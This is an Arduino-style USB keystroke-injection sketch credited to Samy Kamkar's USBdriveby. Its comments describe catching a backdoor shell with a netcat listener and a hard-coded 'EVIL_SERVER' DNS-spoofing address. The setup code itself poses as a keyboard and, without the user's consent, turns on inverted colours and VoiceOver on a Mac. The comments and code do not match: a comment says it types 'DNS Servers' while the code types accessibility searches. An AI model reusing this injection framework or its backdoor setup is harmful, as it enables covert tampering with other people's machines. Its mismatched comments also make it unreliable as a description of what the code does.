// USBdriveby, by samy kamkar
// http://samy.pl/usbdriveby

// in order to listen for the backdoor installed, simply run netcat:
// nc -l 1337
// this listens on port 1337 for a connection from an infected machine
// and once connected, you can begin send commands to the machine!

// here is the ip of the remote dns server we're running which responds to normal DNS requests, but spoofs other requests we specify
// code for our dns spoofing server is at http://samy.pl/usbdriveby
#define EVIL_SERVER "66.228.55.205"

// delay ms
int ds = 500;

#define LED_PIN 13

void setup()
{
  // give us a little time to connect up
  delay(1000);
  
  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // open spotlight (or alfred/qs), then System Preferences<return>
  openapp("System Preferences");

  // CMD+F to go into System Preferences search box
  cmd(KEY_F);

  // Type in DNS Servers<return>
  typeln("Make display easier to see");

  // may take a while
  delay(ds*2);
  // go to invert colors and select
  k(KEY_TAB);
  k(KEY_SPACE);
  
  // CMD+F to go into System Preferences search box
  cmd(KEY_F);
  // go to voice over  
  typeln("Turn VoiceOver on and off");
    // may take a while
  delay(ds*2);
  // go to ivoice over and select
  k(KEY_TAB);
  k(KEY_SPACE);
 
  delay(ds/2);
  k(KEY_TAB);
  delay(5);
  k(KEY_TAB);
  delay(5);
  k(KEY_RETURN);

  // Quit System Preferences/Network
  cmd(KEY_Q);
}


// type a string (pressing enter at the end)
// we have extra delays so we can see what's happening
void typeln(String chars)
{
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds);
}

// open an application on OS X via spotlight/alfred
void openapp(String app)
{
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}


void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds/2);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds/2);
}

void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}








